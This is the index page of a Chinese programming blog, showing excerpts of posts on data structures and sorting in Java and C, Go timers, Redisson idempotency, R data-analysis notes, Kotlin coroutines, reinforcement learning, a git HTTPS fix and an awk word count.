<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/639d3295edfa11ad4423aa8ec86283e5/" rel="bookmark">
			二叉树（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		📑前言 本文主要是【数据结构】——二叉树使用的文章，如果有什么需要改进的地方还请大佬指出⛺️
🎬作者简介：大家好，我是听风与他🥇
☁️博客首页：CSDN主页听风与他
🌄每日一句：狠狠沉淀，顶峰相见
目录 📑前言1.二叉树的创建及打印打印结果: 2.二叉树层次前中后序遍历打印结果: 3.二叉树深度和叶子结点个数📑文章末尾 以如下二叉树为例 1.二叉树的创建及打印 package 二叉树; import java.util.Scanner; public class Main { static class TreeNode{ int data;//结点存放的数据 TreeNode left;//左孩子的引用 TreeNode right;//右孩子的引用 public TreeNode() { } public TreeNode(int data,TreeNode left,TreeNode right) { this.data=data; this.left=left; this.right=right; } } TreeNode root;//整顿二叉树的根 public Main() { root=null;//开始的时候根结点为空 } Scanner sc = new Scanner(System.in); //创建二叉树，递归思想，根，递归左子树，递归右子树，用0表示没有后继的点 public TreeNode createBinaryTree() { TreeNode t;//当前的根结点 int x=sc.nextInt();//从键盘读入当前结点的数值，如果是0表示null结点 if(x==0) {t=null;} else { t=new TreeNode(); t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/639d3295edfa11ad4423aa8ec86283e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e9fbd3dff4f4a6a1e4aad816cfa09ac/" rel="bookmark">
			Java插入排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		插入排序是一种简单直观的排序算法，它的基本思想是将一个元素逐步插入到已经排序好的部分，直至所有元素都被插入完成。以下是插入排序的实现步骤：
从第一个元素开始，该元素可以认为已经被排序。取出下一个元素，在已经排序的元素序列中从后向前扫描。如果该元素（已排序）大于新元素，将该元素移到下一位置。重复步骤3，直到找到已排序的元素小于或等于新元素的位置。将新元素插入到该位置后。 重复步骤2~5，直到整个序列排序完成。 Java代码实现如下，这里也提供了另外2种方法供大家参考：
public class InsertionSort { public static void insertionSort(int[] arr) { //默认索引0的元素已排序，从索引1开始 for (int low = 1; low &lt; arr.length; low++) { int temp = arr[low]; int i = low - 1; // 自右向左找插入位置，如果比待插入元素大，则不断右移，空出插入位置 while (i &gt;= 0 &amp;&amp; temp &lt; arr[i]) { arr[i + 1] = arr[i]; i--; } // 找到插入位置, 此处不加判断也可 if (i != low - 1) { arr[i + 1] = temp; } } } // 相比较第一种方法的缺点: 赋值次数较多 public static void insertionSort2(int[] arr) { for (int low = 1; low &lt; arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e9fbd3dff4f4a6a1e4aad816cfa09ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64942513130c574f91d01d137ac80bb3/" rel="bookmark">
			golang time.Newtimer和time.NewTicker使用和不同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. time.Newtimer是可以在没有强引用的时候被gc回收掉的。但是time.NewTicker必须在defer中使用stop来释放资源，否则资源永远不会被gc回收
2. time.Tick(d Duration) &lt;-chan Time方法是存在资源泄漏的，见注释：
// Tick is a convenience wrapper for NewTicker providing access to the ticking // channel only. While Tick is useful for clients that have no need to shut down // the Ticker, be aware that without a way to shut it down the underlying // Ticker cannot be recovered by the garbage collector; it "leaks". // Unlike NewTicker, Tick will return nil if d &lt;= 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64942513130c574f91d01d137ac80bb3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4927afffe0cc3689e7afef59d756caba/" rel="bookmark">
			八股文学习日常第一期（20240121）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		零、前言 1、目的 帮助掌握面试题，就八股文相关内容展开进行学习和整理，也方便之后的复习和巩固。
2、八股文内容来源 ①https://blog.csdn.net/w20001118/article/details/125724647
一、具体内容分析 1、类的完整书写方式 1.1、类 [Access Modifier] [Modifiers] [Class Name] [Inheritance] [Implemented Interfaces] [Class Body] 具体实例：
public class MyClass extends ParentClass implements Interface1, Interface2 { // 成员变量 private int myField; // 构造函数 public MyClass() { // 构造函数的实现 } // 方法 public void myMethod() { // 方法的实现 } // 实现接口中的方法 @Override public void interfaceMethod() { // 方法的实现 } } 详解：
①访问修饰符（Access Modifier）：用于控制类、成员变量和方法的访问级别，决定了它们可以被哪些其他代码访问
public：被声明为 public 的类、成员变量和方法可以被任何其他类的代码访问
protected：被声明为 protected 的成员变量和方法只能被同一个包中的其他类或其子类访问
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4927afffe0cc3689e7afef59d756caba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac656ea75c1f301672a51c097fd87148/" rel="bookmark">
			【数据结构与算法】归并排序详解：归并排序算法，归并排序非递归实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、归并排序 归并排序是一种经典的排序算法，它使用了分治法的思想。下面是归并排序的算法思想：
递归地将数组划分成较小的子数组，直到每个子数组的长度为1或者0。将相邻的子数组合并，形成更大的已排序的数组，直到最终得到一个完全排序的数组。 归并排序的过程可以分为三个步骤：拆分（Divide）、合并（Merge）和排序（Sort）。
拆分：将待排序的数组不断地划分为两个子数组，直到每个子数组的长度为1或者0。合并：将相邻的子数组合并为一个较大的已排序数组，通过比较两个子数组的首元素，按照从小到大的顺序逐个将元素放入一个辅助数组。排序：重复进行合并的过程，直到最终得到完全排序的数组。 归并排序的时间复杂度为O(nlogn)，其中n是待排序数组的长度。空间复杂度为O(n)，主要是由于需要使用一个大小与原始数组相同的辅助数组来存储合并的结果。
归并排序是一种稳定的排序算法，即相等元素的相对顺序在排序前后保持不变。在合并的过程中，如果遇到两个相等的元素，我们会先将来自前一个子数组的元素放入辅助数组，这样可以确保相等元素的相对顺序不会改变。
代码实现： // 归并排序具体功能实现函数 void MergeSortFun(int* a, int* temp, int begin, int end) { // 如果数组大小为1或者空，直接返回上一层 if (begin &gt;= end) { return; } // 划分数组，递归调用 MergeSortFun 对左右子数组进行排序 int mid = (begin + end) / 2; MergeSortFun(a, temp, begin, mid); MergeSortFun(a, temp, mid + 1, end); // 合并两个有序子数组 int begin1 = begin; int end1 = mid; int begin2 = mid + 1; int end2 = end; int i = begin; // 依次比较两个子数组的元素，将较小的元素放入辅助数组 temp 中 while (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) { if (a[begin1] &lt; a[begin2]) { temp[i++] = a[begin1++]; } else { temp[i++] = a[begin2++]; } } // 将剩余的元素放入辅助数组 temp 中 while (begin1 &lt;= end1) { temp[i++] = a[begin1++]; } while (begin2 &lt;= end2) { temp[i++] = a[begin2++]; } // 将辅助数组 temp 中的元素拷贝回原数组 for (i = begin; i &lt;= end; i++) { a[i] = temp[i]; } } // 归并排序入口函数 void MergeSort(int* a, int n) { int begin = 0; int end = n - 1; // 创建大小为 n 的辅助数组 temp int* temp = (int*)malloc(sizeof(int) * n); // 调用 MergeSortFun 对数组 a 进行归并排序 MergeSortFun(a, temp, begin, end); // 释放辅助数组 temp 的内存空间 free(temp); } 二、归并排序非递归实现 归并排序可以使用非递归的方式实现，其算法思想如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac656ea75c1f301672a51c097fd87148/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f5880c5ca8b6e24ac8d5546dfc4db68/" rel="bookmark">
			PIG框架学习3——Redisson 实现业务接口幂等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		零、前言 ​ 业务接口幂等问题是在开发中遇到的，如果对业务接口代码不进行幂等控制，并且在前端没有对请求进行限制的情况下，可能会出现多次对接口调用，导致错误异常的发生。就上述情况，对PIGX自带的业务接口幂等实现进行了相关的学习，相关具体内容可以参考官方文档，本文章只是作为学习笔记。
一、接口幂等概念 幂等性原本是数学上的概念，在数学中表示对同一操作的多次执行，产生的结果与仅执行一次的结果相同。
用在接口上就可以理解为：同一个接口，多次发出同一个请求，必须保证操作只执行一次。 调用接口发生异常并且重复尝试时，总是会造成系统所无法承受的损失，所以必须阻止这种现象的发生。
实现接口幂等性通常需要考虑以下几个方面：
①请求参数：确保接口请求中的所有参数都是唯一的，不能重复。比如，在生成订单编号时可以使用时间戳或随机数等方式来保证唯一性
②接口设计：接口应该设计为“幂等性操作”，即无论调用多少次，结果都应该相同。例如，修改密码的接口应该设计为只能修改一次，多次修改的请求会被忽略。
③数据库操作：如果接口需要对数据库进行操作，需要确保每次操作都是幂等的。可以通过添加唯一索引或使用乐观锁等方式来避免重复操作
④错误处理：当请求出现异常时，接口应该处理异常并返回相应的错误信息。例如，当订单已经存在时，接口应该返回订单已存在的错误信息，而不是尝试再次创建订单
二、PIGX中具体实现方式 1、依赖的引入 情况①：
如果是其他项目，可以从中央仓库中引入PIGX提供的实现接口幂等的依赖
&lt;dependency&gt; &lt;groupId&gt;com.pig4cloud.plugin&lt;/groupId&gt; &lt;artifactId&gt;idempotent-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;0.4.0&lt;/version&gt; &lt;/dependency&gt; 引入后的包内容如下所示
情况②：
如果项目中原先使用的就是pigx框架，那么在基础平台中的pigx-common-idempotent就已经自带
我们只需要引入pigx-common服务，就可以将实现接口幂等的依赖引入
2、Redis的配置 在配置文件中进行Redis的配置，设置redis存为我们的缓存中间件
通过如下配置，Spring框架会自动启用Redis作为缓存，并将Redis服务器的连接信息配置为指定的主机名和端口号
spring: cache: type: redis data: redis: host: 127.0.0.1 port: 6379 ①spring.cache 对应的配置类是CacheProperties，这个配置项用来指定缓存的类型。在上述示例中，我们将缓存类型设置为Redis，表示使用Redis作为缓存。
② spring.data.redis：这个配置项用来指定连接Redis所需的参数。在上述示例中，我们指定了Redis服务器的主机名为127.0.0.1，端口号为`6379
3、具体使用示例 pigx主要是通过AOP去实现业务接口幂等，其最核心的就是其Idempotent注解，其使用示例如下：
@Idempotent(key = "#demo.username", expireTime = 3, info = "请勿重复查询") @GetMapping("/test") public String test(Demo demo) { return "success"; } 通过使用@Idempotent注解，当多次请求进入test方法时，框架会根据key生成的唯一标识符判断是否已经执行过相同的请求。如果已经执行过，则直接返回之前的结果；如果没有执行过，则继续执行业务逻辑。
这样可以避免重复查询或操作带来的额外开销，并确保系统在重复请求时的一致性和可靠性。
三、原理分析 1、目录结构说明 对于PIGX自带的幂等插件idempotent的目录结构如下所示：
各目录内容说明如下：
- annotation // 关于@Idempotent注解的声明 - @Idempotent - aspect	// 关于AOP的切面方法 - IdempotentAspect - exception	// 自定义异常类 - IdempotentException - expression	// sqel表达式的解析工具 - ExpressionResolver - KeyResolver - IdempotentAutoConfiguration //幂等插件配置文件 - org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f5880c5ca8b6e24ac8d5546dfc4db68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78871b3f242bbdb5e0c500d0691c7afe/" rel="bookmark">
			看书标记【R语言数据分析项目精解：理论、方法、实战 9】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看书标记——R语言 Chapter 9 文本挖掘——点评数据展示策略9.1项目背景、目标和方案9.1.1项目背景9.1.2项目目标9.1.3项目方案1.建立评论文本质量量化指标2.建立用户相似度模型3.对用户评论进行情感性分析 9.2项目技术理论简介9.2.1评论文本质量量化指标模型1.主题覆盖量2.评论文本分词数量3.评论点赞数4.评论中的照片数5.评论分值偏移 9.2.2用户相似度模型1.pearson相关系数2.欧几里得距离3.夹角余弦相似度4.马氏距离 9.2.3情感性分析1.文本挖掘基础知识2.基于规则情感性分析方法3.词汇极性判断4.关键词提取 9.2.4R语言实例代码1.分词2.配置词典3.增加自定义词典4.增加停用词词典5.关键词提取TF-IDF6.词性标注 9.3项目实践9.3.1若干自定义函数1.数据清理3.分词 9.3.2文本质量量化指标模型9.3.3用户相似度模型9.3.4情感词分析1.导入评论数据并清洗分词2.关联情感词、否定词和程度副词3.对片段进行窗口期判定及综合打分 9.3.5总结 【R语言数据分析项目精解：理论、方法、实战 9】 Chapter 9 文本挖掘——点评数据展示策略 9.1项目背景、目标和方案 9.1.1项目背景 评论内容无效、评论数据千人一面，有必要对评论显示策略做出一定的调整
9.1.2项目目标 (1）对评论文本的质量进行监控和量化，将一些无效评论的显示顺序滞后。
(2）制定用户相似度模型，将用户的评论给与他相似的用户看，达到千人百面的效果。
(3）对评论所表达的情感进行分析，综合评分和情感两个方面对评论进行排序。
9.1.3项目方案 1.建立评论文本质量量化指标 对评论文本进行分析，评论文本质量量化指标主要考虑如下几个因素。
(1）主题覆盖量
主要考虑评论文本中对产品专有主题的覆盖情况。
(2）评论文本分词数量
评论文本写得越详细、内容越多，对访问者的帮助可能就越大，删除过渡词后，看剩余文本单词的数量，数量越多，该条评论的信息量就越大。
(3）评论点赞数
评论点赞数越多，该条评论对用户就越有用。
(4）评论中的照片数量
很好理解，有照片的评论显然要比没有照片的评论更加真实和有用。
(5）评论分值偏移
用户给该产品人为打的一个主观评价分，但并不是评分分值越高，该条评论的质量就越高，若用户的打分有失公允，那么该条评论的质量也就不算高了。
2.建立用户相似度模型 用户行为及用户属性，相似度计算，建立相似度模型
3.对用户评论进行情感性分析 基于词典的情感分析对评论文本进行分析。
9.2项目技术理论简介 9.2.1评论文本质量量化指标模型 1.主题覆盖量 指定五个主题，每个主题都有收集对应的相关词汇用于描述相关主题。每涉及一项主题为0.2，满分为1。
2.评论文本分词数量 去除停用词，得到相对真实的论文文本，然后分词，统计词频，最后计算五分位数，每个分位数区间的数从小到大赋予0.2、0.4、0.6、0.8、1分。
3.评论点赞数 计算评论点赞数，也计算五分位数，然后赋值0~1分。
4.评论中的照片数 有照片记为1分，反之为0。
5.评论分值偏移 评论分值偏移就是计算评论分值与所有评论中位数的偏移程度。首先计算所有评分的中位数，然后计算每个分值与中位数的差值绝对值，接着分别计算这些差值绝对值的20%、40%、60%、80%分位数，最后以如下标准计分（依中心递减）：在中位数加减20%分位数内为1分、在中位数减去40%分位数和中位数减去20%分位数之间及中位数加上20%分位数和中位数加上40%分位数之间的记为0.8分，以此类推，在每个区间依次递减0.6、0.4和0.2分，而之所以选择中位数作为中心点是为了防止异常值的影响，针对主题也可以与需求方商讨赋予不同的权重。
9.2.2用户相似度模型 用户相似度模型可以让用户优先看到与之相似的用户的评论数，关于相似度的计算，本质上就是计算两个向量的距离，两个向量的距离越近，它们的相似度就越大。
1.pearson相关系数 衡量两个定距变量线性相关性的统计量，优缺点：皮尔逊相关系数较易理解且计算方便，但是在使用过程中需要假设数据是成对地取自于正态分布，并且从指标的几何意义上来说，它反映了两个向量线性方向的相关关系（成比例关系），非线性的相关关系无法体现。
2.欧几里得距离 优缺点：欧几里德距离是所有距离公式中广为人知且最简单的一种，但是就大部分统计问题而言，其效果不甚理想。每个维度对其贡献都是相等的，并且容易受单位量纲的影响，没有考虑到总体变异对距离远近的关联。为了弥补单位量纲上的差异，可以先对每个维度做标准化处理，然后计算欧几里德距离。
3.夹角余弦相似度 与欧几里得距离不同，夹角余弦相似度侧重于两向量之间方向差异的度量，对量纲上的铭感度较小，所以适用于对绝对数值不敏感、主观评价等数据。
4.马氏距离 本质上是数据协方差距离，考虑了不同维度之间的关系。优缺点：马氏距离去除了各维度之间的相关性，这点也是马氏距离最大的优点。若两个向量中多个维度相关性较高，则某个维度的影响会被多次使用，这显然会对最后的结果产生误差。
9.2.3情感性分析 1.文本挖掘基础知识 （1）分词模型：最大概率模型、隐马尔科夫模型、混合模型
（2）词典：若干单词组成的库，可在知网词典获取停用词、副词、否定词
2.基于规则情感性分析方法 针对每个片段判断其情感极性得分，汇总计算得到情感累计得分：
3.词汇极性判断 介绍一种算法SO-PMI，可以有效地从大量词汇中找出那些接近正向或负向的情感词，然后人为地进行最终判定，从而大大减少人工识别的时间。具体步骤如下（选自《基于平滑SO-PMI算法的微博情感词典构建方法研究》）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78871b3f242bbdb5e0c500d0691c7afe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7100608f44faf9c1cb70fbcc953ec009/" rel="bookmark">
			看书笔记【R语言数据分析项目精解：理论、方法、实战 8】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看书笔记——R语言 Chapter 8 从数据中寻找优质用户8.1项目背景、目标和方案8.1.1项目背景8.1.2项目目标8.1.3项目方案 8.2项目技术理论简介8.2.1逻辑回归的基本概念8.2.2建模流程1.模型开发2.模型验证阶段3.模型测试阶段4.模型实施阶段 8.2.3模型开发阶段1.数据采样2.数据探索3.数据填缺4.离散型变量压缩5.连续型变量压缩6.变量筛选（用到的时候再细看一下，主要是权重那一套）7.变量调整——logit图8.线性假设9.模型开发 8.2.4模型验证阶段8.2.5模型测试阶段8.2.6商业应用流程8.2.7R语言实例代码 8.3项目实践8.3.1数据探索8.3.3建立模型8.3.4模型验证 【R语言数据分析项目精解：理论、方法、实战 8】 Chapter 8 从数据中寻找优质用户 8.1项目背景、目标和方案 8.1.1项目背景 由于活动规模有限，对邀请用户的数量有一定的限制，市场部希望邀请到一些高质量的有潜在购买力的用户，希望在用户画像系统中加入一个能够反映用户是否具有潜在购买力的标签。
8.1.2项目目标 在用户画像的标签制作上加一个标签衡量“潜在购买力”，该标签的目标是一个离散型且分值在10以内的等距量化指标，利用统计模型将用户信息映射到一个离散化的数值范围。
8.1.3项目方案 用近6个月的用户的基本信息和历史行为记录作为训练集建立逻辑回归模型对进行拟合建模，对近一个月内下单的用户购买可能性打标签，市场人员可以就这个指标值挑选。
8.2项目技术理论简介 主要是关于逻辑回归模型的知识。
8.2.1逻辑回归的基本概念 1.引理
对于分类变量，逻辑回归曲线到线性曲线的距离会小于每个点到线性回归的距离。
2.逻辑回归模型
l o g i t ( p ) = l n ( p 1 − p ) = β 0 + β 1 x 1 + . . . + β n x n , x 1 , . . . , x n logit(p)=ln(\frac{p}{1-p})=\beta_0+\beta_1x_1+.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7100608f44faf9c1cb70fbcc953ec009/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7d72d936b1907c75f6000d751c5a726/" rel="bookmark">
			Kotlin协程的JVM实现源码分析（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		协程 根据 是否保存切换 调用栈 ，分为：
有栈协程（stackful coroutine）无栈协程（stackless coroutine） 在代码上的区别是：是否可在普通函数里调用，并暂停其执行。
Kotlin协程，必须在挂起函数中调用和恢复，属于 无栈协程。
常见的语言，协程实现：
有栈协程：Go、Lua无栈协程：Kotlin、C++ 20、Clojure、JavaScript 二、无栈协程 和 Continuation 2.1 CPS（Continuation-passing-style） 在上篇源码分析中，不难发现 执行的结果，都是通过 Continuation 来返回。
2.1.1 Continuation Continuation 就是 一个通用的回调接口，返回 Result&lt;T&gt; 值 或 异常。
Continuation is a generic callback interface. —— Roman Elizarov
public interface Continuation&lt;in T&gt; { public val context: CoroutineContext public fun resumeWith(result: Result&lt;T&gt;) } 2.1.2 CPS 挂起函数 调用 其他挂起函数时，会将自己的 Continuation对象 作为 completion 参数 传递，
这种传递Continuation的方式，称为 连续传递风格（Continuation-passing-style），简称为 CPS。
挂起函数 编译后，会创建基于 ContinuationImpl 对象，把 调用者Continuation 传给 completion 构造参数：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7d72d936b1907c75f6000d751c5a726/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a780b2fb32f49d79840b6916013563e/" rel="bookmark">
			【机器学习】强化学习（五）深度强化学习理论
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		强化学习算法如Q学习的确有一些局限性，比如状态和动作空间过大或过复杂的问题。针对这些问题，有一些解决方案，比如：
使用函数逼近来近似Q函数，而不是用表格存储。函数逼近可以是线性的，也可以是非线性的，比如神经网络。这样可以减少存储空间，也可以处理连续的状态和动作空间。
使用分层强化学习来将复杂的任务分解为子任务，每个子任务有自己的状态和动作空间，以及奖励函数。这样可以降低问题的复杂度，也可以提高学习效率。
使用深度强化学习来结合深度学习和强化学习，利用深度神经网络来表示策略或值函数，从高维的原始输入（比如图像）中提取特征，学习复杂的环境和任务。深度强化学习已经在许多领域取得了令人瞩目的成果，比如AlphaGo，Atari游戏，机器人控制等。
五、深度强化学习
5.1 深度 Q 网络
图：深度 Q 学习中，使用神经网络来逼近 Q 值函数
（2个卷积层，2个全连接层）
DQN的网络结构
深度 Q 网络的网络结构是指用于近似 Q 函数的深度神经网络的结构。深度 Q 网络的网络结构可以根据不同的输入和输出的类型和维度来设计，但是一般都包括以下几个部分：
输入层：输入层是用于接收环境的状态信息的，它可以是一个向量，一个矩阵，或者一个张量。例如，如果输入是图像，那么输入层可以是一个三维的张量，表示图像的高度，宽度和通道数。
隐藏层：隐藏层是用于提取状态信息的特征的，它可以有多个，每个隐藏层都由若干个神经元组成。每个神经元都有一个激活函数，用于增加网络的非线性。隐藏层可以是全连接层，卷积层，循环层，或者其他类型的层。例如，如果输入是图像，那么隐藏层可以是若干个卷积层，用于提取图像的局部特征。
输出层：输出层是用于输出每个动作的 Q 值的，它的神经元的个数等于动作空间的大小。输出层一般是一个全连接层，没有激活函数。输出层的每个神经元都对应一个动作，其输出的值就是该动作的 Q 值。例如，如果动作空间是离散的，有四个动作，那么输出层就有四个神经元，分别表示上，下，左，右的 Q 值。
DQN概述1
DQN概述2
算法： 具有经验回放的深度 Q 学习
DQN的改进算法
5.2 策略梯度算法
策略梯度算法处理离散动作和连续动作的区别
策略梯度算法与深度Q网络算法的区别
目标函数的构造方法
目标函数对策略参数的梯度形式
策略梯度定理的证明
REINFORCE 算法流程
对于连续动作空间强化学习路径规划问题，有哪些求解方法
参考网址：
- [DQN论文](https://storage.googleapis.com/deepmind-media/dqn/DQNNaturePaper.pdf)
- [DQN 的改进算法的综述](https://arxiv.org/abs/1710.02298)
- [DQN 的改进算法的论文解读](https://zhuanlan.zhihu.com/p/32817711)
- [DQN 的改进算法的代码实现](https://github.com/higgsfield/RL-Adventure-2)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/227e2ec6b19c676a0e48a89992379c0e/" rel="bookmark">
			Ubuntu 使用 git 能够 clone 但不能 push 的参考解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 自己的测试环境：Ubuntu20.04
下面的操作都是和 git 有关，所以针对不同的操作系统（比如 Windows）也是一样的。
一、问题描述 在此之前使用git执行 git push origin master 的命令时，能够正常执行，但是一段时间之后，再次执行该命令，出现了如下问题：
ssh: connect to host github.com port 22: Connection timed out fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. 二、解决方法 出现这种情况后, 自己重新生成了ssh key，并且把id_rsa.pub中的内容复制到了 github的SSH keys中，但是依旧没能实现想要的效果。根据当前终端的报错信息ssh: connect to host github.com port 22: Connection timed out以及通过查阅其他资源，可能是当前的网络环境禁用了port 22，因此切换到https传输, 进行上传。
具体操作：
打开修改 url = git@github.com:用户名/仓库名.git 修改为
url = https://用户名@github.com/用户名/仓库名.git 然后退出。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/227e2ec6b19c676a0e48a89992379c0e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3702074f617aa0f2793539022a24a744/" rel="bookmark">
			5.3 内容管理模块 - 课程发布、任务调度、页面静态化、熔断降级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内容管理模块 - 课程发布 - 任务调度、熔断降级、页面静态化 文章目录 内容管理模块 - 课程发布 - 任务调度、熔断降级、页面静态化一、课程发布 - 任务调度1.1 添加Maven依赖1.2 XxlJobConfig配置文件1.3 消息处理抽象类 MessageProcessAbstract1.4 课程发布任务类 CoursePublishTask1.5 执行器配置信息1.6 添加任务管理 二、 课程发布 - 页面静态化2.1 静态化测试2.1.1 Maven依赖2.1.2 静态化测试 2.2 上传文件测试2.2.1 Feign 远程调用2.2.2 扩充上传文件接口2.2.3 远程调用测试 2.3 熔断 - 降级2.3.1 介绍2.3.2 熔断 - 降级处理 2.4 页面静态化任务2.4.1 CoursePublishServiceImpl2.4.2 课程发布任务类 CoursePublishTask 一、课程发布 - 任务调度 下面完成这几步，这几步在消息的SDK中已经给我们提供了
1.1 添加Maven依赖 content-service工程中添加xxl-job依赖
&lt;dependency&gt; &lt;groupId&gt;com.xuxueli&lt;/groupId&gt; &lt;artifactId&gt;xxl-job-core&lt;/artifactId&gt; &lt;/dependency&gt; 1.2 XxlJobConfig配置文件 content-service工程中添加XxlJobConfig配置文件
@Configuration public class XxlJobConfig { private Logger logger = LoggerFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3702074f617aa0f2793539022a24a744/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05c320adf11f1c84b63cda52a4ab3ece/" rel="bookmark">
			awk做wordcount
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用awk进行wordcount
被处理数据在文件access_2024-1-21.log（一个单词一行）中，内容如下：
word coutn wm sapce US china WORD WORD wode wode 1 2 3333 zzzz space spaceX china word 执行如下命令可以统计出每个单词出现次数：
```bash awk '{S[$1]++}END{for(k in S) print S[k],k}' access_2024-1-21.log 结果如下：
[root@Oler wm]# awk ‘{S[$1]++}END{for(k in S) print S[k],k}’ access_2024-1-21.log
1 spaceX
1 3333
1 zzzz
1 sapce
1 coutn
1 wm
1 space
1 1
1 2
2 china
2 wode
2 WORD
1 US
2 word
命令解释：
此处的S变量表示一个数组，该数组的索引为每个不重复的单词，值就是S[$1]，$1代表单词那一列。awk是每都一行执行一次动作。 此处就是每读一行，同一个key对应的值就增加一。从0开始计算。当统计完，最后,也就是END对应的内容，就是循环打印出存储了统计结果的数组的key和值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fe770810ff259e8f1a4a4784b9a52b9/" rel="bookmark">
			5.2 内容管理模块 - 课程发布需求分析、分布式技术方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内容管理模块 - 课程发布 - 分布式技术方案、 课程发布需求分析 文章目录 内容管理模块 - 课程发布 - 分布式技术方案、 课程发布需求分析一、分布式事务技术方案1.1 本地事务1.2 分布式事务1.3 CAP理论1.4 分布式事务控制方案 二、课程发布2.1 需求分析2.2 数据模型2.2.1 课程发布表 course_publish2.2.2 消息表mq_message2.2.3 消息历史表 mq_message_history 2.3 课程发布 分布式事物控制方案2.4 CoursePublishController2.5 CoursePublishServiceImpl2.6 消息2.6.1 消息模块技术方案2.6.2 添加依赖2.6.3 完善 CoursePublishServiceImpl2.6.4 测试 一、分布式事务技术方案 1.1 本地事务 首先理解什么是本地事务？
说白了就是通过数据库可以控制事物，使用服务自己的数据库来控制事物
我们在java代码中会使用@Transactional注解进行标注
平常我们在程序中通过spring去控制事务是利用数据库本身的事务特性来实现的，因此叫数据库事务，
由于应用主要靠关系数据库来控制事务，此数据库只属于该应用，所以基于本应用自己的关系型数据库的事务又被称为本地事务。
本地事务具有ACID四大特性，
数据库事务在实现时会将一次事务涉及的所有操作全部纳入到一个不可分割的执行单元，
